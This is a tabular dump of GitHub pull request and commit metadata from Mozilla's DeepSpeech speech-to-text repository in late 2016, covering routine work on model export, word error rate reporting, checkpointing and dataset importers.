4459,https://api.github.com/repos/mozilla/DeepSpeech/pulls/112,112,Implement model exporting,,Cwiiis,668518,2016-11-01T17:27:11Z,CONTRIBUTOR,True,116,42,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21c1d1fe1fff40db145a500c923c24ff3ee5e1a9,Use reshape/unpack to remove dependency on n_steps in BiRNN()
4460,https://api.github.com/repos/mozilla/DeepSpeech/pulls/112,112,Implement model exporting,,Cwiiis,668518,2016-11-01T17:27:11Z,CONTRIBUTOR,True,116,42,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0697b94459a3aa7b376f36f03243d8718bca901,Export model after training
4461,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7d009fef84ffb1a01e3d70896dc1e8564c545cd,Fix #15; logging top ten lowest loss samples
4462,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0849efd6daff49389437195acc91ca9de60f04e6,Fix #111; documented and revisited WER calculation
4463,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcd99b790a9644ad099b360806969f374bae5203,Fix #110; Fixed average accuracy calculation
4464,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b82d477d23088a4f69b4a2d4c150d8ce6d766bed,Changed language version back to 2.7.11
4465,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8904aa85e9f98bef4e54320f8ff01f5522a07a14,Better documentation for get_tower_results
4466,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56c10b1d1ee151fa77faeba9caa8d7313330e09f,Fix #114; better WER reporting
4467,https://api.github.com/repos/mozilla/DeepSpeech/pulls/104,104,Fix #15; logging top ten lowest loss samples,"@kdavis-mozilla : First draft of the top ten lowest loss report. Please take a brief look and tell, if this is what you intended.
",tilmankamp,5991088,2016-10-28T13:24:05Z,CONTRIBUTOR,True,148,43,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02ee478892d8ce5852f97fbd9b31977f5684cec9,Fixes for PR
4468,https://api.github.com/repos/mozilla/DeepSpeech/pulls/103,103,Wer update,,lissyx,1645737,2016-10-27T16:38:14Z,COLLABORATOR,True,48,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ff340f82ab564dd29410471cd8a875cea21c398,Fixes #101
4469,https://api.github.com/repos/mozilla/DeepSpeech/pulls/103,103,Wer update,,lissyx,1645737,2016-10-27T16:38:14Z,COLLABORATOR,True,48,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33e9912259a947804f3e109a26df5be88994a781,Updates suggested in first review of #102
4470,https://api.github.com/repos/mozilla/DeepSpeech/pulls/103,103,Wer update,,lissyx,1645737,2016-10-27T16:38:14Z,COLLABORATOR,True,48,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47bb4babde6897cdc1e6150a67d7c6fc0bf009d8,"Merge pull request #102 from mozilla/issue101

Fixes #101"
4471,https://api.github.com/repos/mozilla/DeepSpeech/pulls/102,102,Fixes #101,"@reuben could you review this change
",kdavis-mozilla,12054740,2016-10-27T03:59:30Z,CONTRIBUTOR,True,48,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ff340f82ab564dd29410471cd8a875cea21c398,Fixes #101
4472,https://api.github.com/repos/mozilla/DeepSpeech/pulls/102,102,Fixes #101,"@reuben could you review this change
",kdavis-mozilla,12054740,2016-10-27T03:59:30Z,CONTRIBUTOR,True,48,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33e9912259a947804f3e109a26df5be88994a781,Updates suggested in first review of #102
4473,https://api.github.com/repos/mozilla/DeepSpeech/pulls/100,100,Fix issue #90 and issue #99,,Cwiiis,668518,2016-10-26T15:16:34Z,CONTRIBUTOR,False,89,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ebdebb59bf29629cb2e00d7425189c89e767463f,Derive n_steps from batch shape
4474,https://api.github.com/repos/mozilla/DeepSpeech/pulls/100,100,Fix issue #90 and issue #99,,Cwiiis,668518,2016-10-26T15:16:34Z,CONTRIBUTOR,False,89,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b50a7e80342758f66506d6309682d17db0cdcac5,Use reshape/unpack to remove dependency on n_steps in BiRNN()
4475,https://api.github.com/repos/mozilla/DeepSpeech/pulls/100,100,Fix issue #90 and issue #99,,Cwiiis,668518,2016-10-26T15:16:34Z,CONTRIBUTOR,False,89,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bc6c6c5134ef0bbfc88786cffe756b83d49574a2,Export the model after training
4476,https://api.github.com/repos/mozilla/DeepSpeech/pulls/98,98,Wer update,,lissyx,1645737,2016-10-26T13:56:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1150c1c5ec58582edef5b01be7d1ce86f8ce3405,"Fix TED LIUM automation path

Fixes #96"
4477,https://api.github.com/repos/mozilla/DeepSpeech/pulls/98,98,Wer update,,lissyx,1645737,2016-10-26T13:56:12Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9213014409417abb59fd4c6214d5e183f94a155,"Merge pull request #97 from lissyx/issue96

Fix TED LIUM automation path"
4478,https://api.github.com/repos/mozilla/DeepSpeech/pulls/97,97,Fix TED LIUM automation path,"Fixes #96
",lissyx,1645737,2016-10-26T13:54:11Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1150c1c5ec58582edef5b01be7d1ce86f8ce3405,"Fix TED LIUM automation path

Fixes #96"
4479,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c6454581bb37c4778f69e1644684fb6f136ada7,"Introduce ds_checkpoint_dir to change checkpointing directory

Fixes #85"
4480,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7cbf61d22ce5f3e230017ea7521a85f77097790,"Merge pull request #86 from lissyx/issue85

Introduce ds_checkpoint_dir to change checkpointing directory"
4481,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,781be5d9bcdad96c11dc20b3f64488bafa02ce38,"Handling of website publication

Fixes #73"
4482,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,117a6234a88f7f295bbfd2abde024594adfdc6e2,"WER automation code

Fixes #73"
4483,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7d54257becb9ae37bbacad2c1676666c2cb4220,Fixed #92
4484,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6bf3e94d2ce4ca33bdb8347c599c20b6feb6d3d4,"Merge pull request #93 from mozilla/issue92

Fixed #92"
4485,https://api.github.com/repos/mozilla/DeepSpeech/pulls/95,95,Wer update,,lissyx,1645737,2016-10-26T13:36:22Z,COLLABORATOR,True,610,6,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93f35bd81a72f5d6bb939afec86a351474887111,"Merge pull request #89 from lissyx/website

Website"
4486,https://api.github.com/repos/mozilla/DeepSpeech/pulls/93,93,Fixed #92,"Fix issue #92 
",kdavis-mozilla,12054740,2016-10-26T09:12:51Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b7d54257becb9ae37bbacad2c1676666c2cb4220,Fixed #92
4487,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2ea9dccc08518c236bdc293ac600f07d2695195,Removed tf.split added tf.unpack
4488,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8dad827edff499da8e43226fb83df8fa306ab620,Made BiRNN independent of n_steps
4489,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8bdefd6a66666e3420ce52b96e8da627960b62e,Removed n_steps use in calculate_accuracy_and_loss()
4490,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,996a49aecdf960ad6020074ac4b99de0802e5576,Removed n_steps from importers
4491,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,99e8bd45f35da67d4c3d49b2a85c50cf7ea35f68,Updated in respose to comments
4492,https://api.github.com/repos/mozilla/DeepSpeech/pulls/91,91,Issue90,"Fix #90 @Cwiiis could you please review
",kdavis-mozilla,12054740,2016-10-25T06:54:38Z,CONTRIBUTOR,False,21,20,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9c8920977877d1066bcf1eec0d9c5fe7f5c9bf21,Fixed comment
4493,https://api.github.com/repos/mozilla/DeepSpeech/pulls/89,89,Website,,lissyx,1645737,2016-10-24T14:33:34Z,COLLABORATOR,True,608,5,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,781be5d9bcdad96c11dc20b3f64488bafa02ce38,"Handling of website publication

Fixes #73"
4494,https://api.github.com/repos/mozilla/DeepSpeech/pulls/89,89,Website,,lissyx,1645737,2016-10-24T14:33:34Z,COLLABORATOR,True,608,5,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,117a6234a88f7f295bbfd2abde024594adfdc6e2,"WER automation code

Fixes #73"
4495,https://api.github.com/repos/mozilla/DeepSpeech/pulls/86,86,Introduce ds_checkpoint_dir to change checkpointing directory,"Fixes #85
",lissyx,1645737,2016-10-24T12:36:52Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c6454581bb37c4778f69e1644684fb6f136ada7,"Introduce ds_checkpoint_dir to change checkpointing directory

Fixes #85"
4496,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7eaf9939b1ec6f9688fcadda0a26001969f9907,Implement Fisher corpus importer
4497,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8aaffce620c35b55c65e840ddb3a67f8c2fbd68,Address review comments and do further filtering and cleanup on the transcription data
4498,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a40df7251e10dbf3d7143ecaed7c6bc4666850fe,Convert each channel individually before splitting wav files
4499,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7bbfbf703b82bee83cb60265ae67f337cbc3f00,Convert Fisher importer to new input system
4500,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4dcd312cefcb053cc163a6e81cdb33a0e62e63f,Update Fisher importer to the new next_batch API
4501,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33c9521a6f8b731c0a67a6a2147d12e83f7ec139,Add validation and cleanup function to util/text.py
4502,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ef07ce7d0bf8ebd90d2be93463a290347efb16e,Adapt Fisher importer to other importer API changes
4503,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64724815e7b2b343f25f235b27d9afb634610e49,Remove unneeded check from _maybe_split_wav
4504,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dc2e98c8ff2d7ad33d5265a4db867eb2b81468c,Add code to manually fix broken transcript
4505,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53f76b30f8e07eee8b80c6ad0e144558db1cdaf3,Add bin/run-fisher.sh script for training with Fisher
4506,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fc818b87ac2aef49c52ec348a4cc64592445c1a,Remove unnecessary file existence check and comment
4507,https://api.github.com/repos/mozilla/DeepSpeech/pulls/84,84,Implement Fisher corpus importer,"I left some logging in since this is a long running process and it's useful to know how things are going. This code also does not delete any of the original files since disk is cheap and this makes it faster to fix the importer if something is wrong.

I haven't done a full run with the train/dev/test splitting code yet, I'll do that when the server is not being used.
",reuben,477142,2016-10-22T12:47:14Z,MEMBER,True,365,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec590bd40b8baa7f92b21066861999fbda645829,Remove ds_dataset_path export from run-fisher.sh
4508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/77,77,LDC93S1 Simple sample importer,"Fixes #72
",lissyx,1645737,2016-10-19T17:01:06Z,COLLABORATOR,True,123,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a6d4373cffc460bd84ce4068fc1edce26347bf4a,"LDC93S1 Simple sample importer

Fixes #72"
4509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/76,76,Using env variables to control execution parameters,"Fixes #75
",lissyx,1645737,2016-10-19T17:00:09Z,COLLABORATOR,True,35,23,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,368d8ee7f4e73075ddba57124476fcc4fc11d6c9,"Using env variables to control execution parameters

Fixes #75"
4510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/74,74,Ensure merge_logs() sorts directory,"Fixes #71
",lissyx,1645737,2016-10-19T16:53:45Z,COLLABORATOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3046d9f6bbd226b7ef6db5750b3e4b606ebae928,"Ensure merge_logs() sorts directory

Fixes #71"
4511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/70,70,Fix #69 - Don't delete TED data archive after extraction,,Cwiiis,668518,2016-10-18T14:55:05Z,CONTRIBUTOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ef23ee6189707ba832b8db607f810409879cf27,Fix #69 - Don't delete TED data archive after extraction
4512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/68,68,Fix #67,"WER is calculated using Levenshtein distance on chars, not words
",kdavis-mozilla,12054740,2016-10-17T16:50:38Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43303a21997ce4d55f27af06f014c5ee18fb146d,"Fix #67

WER is calculated using Levenshtein distance on chars, not words"
4513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/66,66,Fixed typo in wers,,kdavis-mozilla,12054740,2016-10-17T12:47:43Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f8c0b57578af305b577d4bf127187dda133be863,Fixed typo in wers
4514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/64,64,Fix #63: Now the longest wav is the example,,kdavis-mozilla,12054740,2016-10-17T10:54:33Z,CONTRIBUTOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,833604ecf1e19b825b9a4eabd38072edefc7cf88,Fix #63: Now the longest wav is the example
4515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/60,60,Fixed #59: Fixed ted_lium => batch_set,,kdavis-mozilla,12054740,2016-10-15T14:45:18Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,55863557fee6f2d8c7e64bee084ec7b2df9eb5dd,Fixed #59: Fixed ted_lium => batch_set
4516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/58,58,Fixed #57: Hyperparams at values from DeepSpeech paper or reasonable values,,kdavis-mozilla,12054740,2016-10-14T19:08:14Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df266f9778165804217a1949266aa0017f68f7c3,Fixed #57: Hyperparams at values from DeepSpeech paper or reasonable values
4517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/56,56,Fix #13; Fix #14; Reporting of WERs by index.htm,"@kdavis-mozilla : First version of the reporting page.
",tilmankamp,5991088,2016-10-14T16:35:45Z,CONTRIBUTOR,True,300,0,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b73187736833691ffadb31068d76f884c5782f6d,Fix #13; Fix #14; Reporting of WERs by index.htm
4518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/55,55,Fixed #54,"Fixed issue #54  `ted_lium.validation` changed to `ted_lium.dev`
",kdavis-mozilla,12054740,2016-10-14T12:01:32Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6adf27a86a9272dcc515f21b37d737a12e54ba4,Fixed #54
4519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d6755d93d557659ee610f9ed7b5eb5fa164d505,Fix of issue #23
4520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8fdafe60b468c6db05bf6f02b6da26455738ddf,Fix #16; Logging activations and gradients
4521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,410e0d2f411e772d925cf7efa88661c4d321f2c7,Added checkpointing
4522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/52,52,"Issue #46: Download, extract and format LibriVox data","@kdavis-mozilla can you review this?
",reuben,477142,2016-10-08T20:20:42Z,MEMBER,False,1185,5451,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f04025911e1d31675238535f2e70105ede81eec8,Fixed issue #2 and issue #4
